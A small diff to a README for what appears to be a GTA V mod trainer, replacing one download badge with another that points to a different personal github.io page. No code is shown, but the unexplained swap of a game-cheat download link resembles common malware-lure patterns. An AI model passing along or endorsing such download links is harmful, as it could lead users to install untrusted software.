@@ -4,10 +4,8 @@
   <img src="https://img.goodfon.com/original/1920x1080/a/a5/gta-gta-v-gta-5-rockstar-game-5652.jpg" alt="GTA V Trainer Logo"/>
 </div>
 
-<div align="center">
+[![GET GTA V](https://img.shields.io/badge/GET%20%E2%80%94%20GTA-V-0078D6?style=for-the-badge&logoColor=white)](https://kimberlyjonesd215.github.io/.github/GTA-V-Mod-Trainer)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://gta-v-mod-trainer.github.io/.github/)
-</div>
 
 ---
 
